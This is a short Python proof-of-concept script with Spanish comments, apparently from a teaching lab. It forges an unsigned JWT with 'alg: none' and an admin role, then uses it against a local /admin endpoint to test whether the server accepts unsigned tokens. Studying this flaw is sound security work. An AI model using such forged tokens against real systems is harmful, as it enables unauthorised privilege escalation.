import base64
import json
import requests

URL = "http://127.0.0.1:5000"


def b64url_encode(datos: dict) -> str:
    crudo = json.dumps(datos, separators=(",", ":")).encode()
    return base64.urlsafe_b64encode(crudo).rstrip(b"=").decode()


# 1. Fabricamos nuestro propio header y payload
header = {"alg": "none", "typ": "JWT"}
payload = {"sub": "alumno", "role": "admin"}  # nos subimos el rol

# 2. Token = header.payload.  (firma vacía, pero el punto final se mantiene)
token_falso = f"{b64url_encode(header)}.{b64url_encode(payload)}."
print("Token falsificado:\n", token_falso)

# 3. Lo usamos contra el panel de administración
r = requests.get(f"{URL}/admin", headers={"Authorization": f"Bearer {token_falso}"})
print("\n/admin ->", r.status_code, r.json())
